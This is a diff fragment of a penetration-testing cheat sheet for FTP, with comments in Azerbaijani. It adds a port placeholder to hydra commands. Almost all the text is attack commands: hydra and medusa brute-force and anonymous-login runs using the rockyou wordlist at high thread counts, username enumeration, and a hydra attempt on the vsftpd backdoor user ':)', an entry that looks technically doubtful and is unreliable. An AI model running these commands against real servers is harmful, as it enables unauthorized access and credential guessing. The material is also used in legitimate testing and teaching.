@@ -34,13 +34,13 @@ medusa -h <target_ip> -u anonymous -p "-" -M ftp  # "-" blank pass
 
 ```bash
 # Basic brute
-hydra -L /usr/share/wordlists/dirb/common.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_ip> -t 64 -w 10 -vV
+hydra -L /usr/share/wordlists/dirb/common.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>:PORT -t 64 -w 10 -vV
 
 # Anonymous test + timeout
 hydra -l anonymous -p "" ftp://<target_ip>/ -t 128 -W 5
 
 # User enum (error diff ilə)
-hydra -L ftp_users.txt -p testpass ftp://<target_ip> -t 64 -f -V  # -f ilk success-də dayandır
+hydra -L ftp_users.txt -p testpass ftp://<target_ip>:PORT -t 64 -f -V  # -f ilk success-də dayandır
 
 # Custom module ilə (vsftpd backdoor)
 hydra -l ":)" -p any ftp://<target_ip>  # Backdoor user
